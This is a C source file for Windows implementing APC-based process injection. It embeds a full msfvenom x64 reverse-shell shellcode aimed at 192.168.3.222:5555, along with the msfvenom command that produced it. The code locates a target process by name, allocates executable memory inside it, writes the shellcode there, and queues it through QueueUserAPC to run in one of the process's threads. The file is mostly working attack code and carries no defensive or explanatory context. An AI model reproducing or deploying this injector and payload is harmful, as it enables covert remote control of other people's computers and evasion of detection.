#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <stdlib.h>



// payload: reverse shell (msfvenom)
unsigned char payload[]= 
// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.3.222 LPORT=5555 -a x64 --platform Windows -f c -b '\x00'
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x04\x46\xee\x1f\x99\xf7\x94\x99\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf8\x0e\x6d"
"\xfb\x69\x1f\x54\x99\x04\x46\xaf\x4e\xd8\xa7\xc6\xc8\x52"
"\x0e\xdf\xcd\xfc\xbf\x1f\xcb\x64\x0e\x65\x4d\x81\xbf\x1f"
"\xcb\x24\x0e\x65\x6d\xc9\xbf\x9b\x2e\x4e\x0c\xa3\x2e\x50"
"\xbf\xa5\x59\xa8\x7a\x8f\x63\x9b\xdb\xb4\xd8\xc5\x8f\xe3"
"\x5e\x98\x36\x76\x74\x56\x07\xbf\x57\x12\xa5\xb4\x12\x46"
"\x7a\xa6\x1e\x49\x7c\x14\x11\x04\x46\xee\x57\x1c\x37\xe0"
"\xfe\x4c\x47\x3e\x4f\x12\xbf\x8c\xdd\x8f\x06\xce\x56\x98"
"\x27\x77\xcf\x4c\xb9\x27\x5e\x12\xc3\x1c\xd1\x05\x90\xa3"
"\x2e\x50\xbf\xa5\x59\xa8\x07\x2f\xd6\x94\xb6\x95\x58\x3c"
"\xa6\x9b\xee\xd5\xf4\xd8\xbd\x0c\x03\xd7\xce\xec\x2f\xcc"
"\xdd\x8f\x06\xca\x56\x98\x27\xf2\xd8\x8f\x4a\xa6\x5b\x12"
"\xb7\x88\xd0\x05\x96\xaf\x94\x9d\x7f\xdc\x98\xd4\x07\xb6"
"\x5e\xc1\xa9\xcd\xc3\x45\x1e\xaf\x46\xd8\xad\xdc\x1a\xe8"
"\x66\xaf\x4d\x66\x17\xcc\xd8\x5d\x1c\xa6\x94\x8b\x1e\xc3"
"\x66\xfb\xb9\xb3\x56\x27\x80\xe7\xab\x5b\x75\xdc\x1f\x99"
"\xb6\xc2\xd0\x8d\xa0\xa6\x9e\x75\x57\x95\x99\x04\x0f\x67"
"\xfa\xd0\x4b\x96\x99\x11\xf5\x2e\xb7\x9a\x29\xd5\xcd\x4d"
"\xcf\x0a\x53\x10\x06\xd5\x23\x48\x31\xc8\x18\x66\x22\xd8"
"\x10\xee\x2e\xef\x1e\x99\xf7\xcd\xd8\xbe\x6f\x6e\x74\x99"
"\x08\x41\xc9\x54\x0b\xdf\xd6\xd4\xc6\x54\xd1\xfb\x86\xa6"
"\x96\x5b\xbf\x6b\x59\x4c\xcf\x2f\x5e\x23\x1d\x9b\x46\xe4"
"\xb9\x3b\x57\x10\x30\xfe\x89\x45\x1e\xa2\x96\x7b\xbf\x1d"
"\x60\x45\xfc\x77\xba\xed\x96\x6b\x4c\x4c\xc7\x2a\x5f\x9b"
"\xf7\x94\xd0\xbc\x25\x83\x7b\x99\xf7\x94\x99\x04\x07\xbe"
"\x5e\xc9\xbf\x1d\x7b\x53\x11\xb9\x52\xa8\x37\xfe\x94\x5d"
"\x07\xbe\xfd\x65\x91\x53\xdd\x20\x12\xef\x1e\xd1\x7a\xd0"
"\xbd\x1c\x80\xee\x77\xd1\x7e\x72\xcf\x54\x07\xbe\x5e\xc9"
"\xb6\xc4\xd0\xfb\x86\xaf\x4f\xd0\x08\x5c\xd4\x8d\x87\xa2"
"\x96\x58\xb6\x2e\xe0\xc8\x79\x68\xe0\x4c\xbf\xa5\x4b\x4c"
"\xb9\x24\x94\x97\xb6\x2e\x91\x83\x5b\x8e\xe0\x4c\x4c\x64"
"\x2c\xa6\x10\xaf\xa5\x3f\x62\x29\x04\xfb\x93\xa6\x9c\x5d"
"\xdf\xa8\x9f\x78\x4c\x6e\xe4\x79\x82\x91\x22\x43\x55\x9c"
"\x70\xf3\xf7\xcd\xd8\x8d\x9c\x11\xca\x99\xf7\x94\x99";
unsigned int payload_len = sizeof(payload);


DWORD GetProcessIdByName(LPSTR name);
DWORD GetThreadID(DWORD TargetProcess_PID);
BOOL InjectShellcode(DWORD TargetProcess_PID, DWORD TargetProcess_ThreadID);

int main (int argc,char**argv){
  

  DWORD TargetProcess_PID = GetProcessIdByName(argv[1]);
  printf ("[+] TargetProcess_PID : %d\n",TargetProcess_PID);
  if (TargetProcess_PID == 0){
    printf ("failed to get PID : ERROR %d\n",GetLastError());
    return 0;
  }


  DWORD TargetProcess_ThreadID = GetThreadID(TargetProcess_PID);
  printf ("[+] Target Thread ID : %d\n", TargetProcess_ThreadID ); 

 
  if (InjectShellcode(TargetProcess_PID, TargetProcess_ThreadID)) {
    printf("\n[+] shellcode injected successfully!\n");
  } else {
    printf("\n[+] shellcode injection failed.\n");
  }

  return 0;
}


DWORD GetProcessIdByName(LPSTR name){
    PROCESSENTRY32 pe32;
    HANDLE snapshot = NULL;
    DWORD pid = 0;
 
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE){
      pe32.dwSize = sizeof(PROCESSENTRY32);
 
      if (Process32First(snapshot, &pe32)){
        do {
          if (!lstrcmp(pe32.szExeFile, name)){
            pid = pe32.th32ProcessID;
            break;
          }
        } while (Process32Next(snapshot, &pe32));
      }
      CloseHandle(snapshot);
    }
    return pid;
} 


DWORD GetThreadID(DWORD TargetProcess_PID){
  THREADENTRY32 te32;
  HANDLE hThreadSnap; 

   
  hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
  if( hThreadSnap == INVALID_HANDLE_VALUE ) 
    return( FALSE ); 
 

  te32.dwSize = sizeof(THREADENTRY32); 
 

  if( !Thread32First( hThreadSnap, &te32 ) ) {
    printf("Thread32First Error : %u\n",GetLastError()) ; 
    CloseHandle( hThreadSnap );                           
    return( FALSE );
  }


  do { 
    if( te32.th32OwnerProcessID == TargetProcess_PID ){
     break;
    }
  } while( Thread32Next(hThreadSnap, &te32 ) );

  CloseHandle( hThreadSnap );
  return te32.th32ThreadID;
}


BOOL InjectShellcode(DWORD TargetProcess_PID, DWORD TargetProcess_ThreadID) { 
  

  HMODULE kernel32_Handle           = GetModuleHandleA("kernel32.dll") ; 
  FARPROC OpenThread_Addr           = GetProcAddress(kernel32_Handle, "OpenThread"); 
  FARPROC OpenProcess_Addr          = GetProcAddress(kernel32_Handle, "OpenProcess"); 
  FARPROC VirtualAllocEx_Addr       = GetProcAddress(kernel32_Handle, "VirtualAllocEx"); 
  FARPROC WriteProcessMemory_Addr   = GetProcAddress(kernel32_Handle, "WriteProcessMemory"); 
  FARPROC VirtualProtectEx_Addr     = GetProcAddress(kernel32_Handle, "VirtualProtectEx"); 
  FARPROC CreateRemoteThread_Addr   = GetProcAddress(kernel32_Handle, "CreateRemoteThread"); 
  FARPROC VirtualFreeEx_Addr        = GetProcAddress(kernel32_Handle, "VirtualFreeEx"); 
  FARPROC CloseHandle_Addr          = GetProcAddress(kernel32_Handle, "CloseHandle"); 
  FARPROC GetThreadContext_Addr     = GetProcAddress(kernel32_Handle, "GetThreadContext"); 
  FARPROC SetThreadContext_Addr     = GetProcAddress(kernel32_Handle, "SetThreadContext"); 
  FARPROC QueueUserAPC_Addr         = GetProcAddress(kernel32_Handle, "QueueUserAPC"); 
  FARPROC ResumeThread_Addr         = GetProcAddress(kernel32_Handle, "ResumeThread"); 
    
  
    

  HANDLE Target_Process_Handle = (HANDLE)OpenProcess_Addr(PROCESS_ALL_ACCESS,FALSE,TargetProcess_PID);
  if (!Target_Process_Handle){
    printf ("Unable to open the target Process: ERROR (%d)\n",GetLastError());
    return FALSE;
  }
  printf ("[+] getting Process HANDLE : %d\n", Target_Process_Handle);


  LPVOID lpBaseAddr = (LPVOID) VirtualAllocEx_Addr(Target_Process_Handle, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (lpBaseAddr == NULL) {
    printf("VirtualAllocEx failed (%d)\n", GetLastError());
    return FALSE;
  }
  printf ("[+] Base address of remote thread : 0x%08X\n",lpBaseAddr);
    

  if(!WriteProcessMemory_Addr(Target_Process_Handle, lpBaseAddr, payload, payload_len, NULL)){ 
    printf ("WriteProcessMemory ERROR : %u\n",GetLastError());
    return FALSE;
  }
  printf ("[+] Writing memory to the process: Success\n");


  HANDLE Target_Process_Thread_Handle = (HANDLE)OpenThread_Addr(THREAD_ALL_ACCESS ,FALSE,TargetProcess_ThreadID);
  if (!Target_Process_Thread_Handle){
    printf ("Unable to open the target Thread : ERROR (%d)\n",GetLastError());
    return FALSE;
  }
  printf ("[+] getting Thread HANDLE : %d\n", Target_Process_Thread_Handle);
  

  if(!QueueUserAPC_Addr((PAPCFUNC)lpBaseAddr,Target_Process_Thread_Handle,(ULONG_PTR)NULL)){
    printf ("QueueUserAPC ERROR : %u\n",GetLastError());
    return FALSE;
  }
  printf("[+] Adding user-mode asynchronous procedure call (APC) to the APC queue of the thread: Success\n");
  
  
  printf ("[+] resuming Thread and exiting \n");      
  ResumeThread_Addr(Target_Process_Thread_Handle);


  Sleep(2000);


  CloseHandle_Addr(Target_Process_Thread_Handle);
  CloseHandle_Addr(Target_Process_Handle);
 
    
  return( TRUE );
}
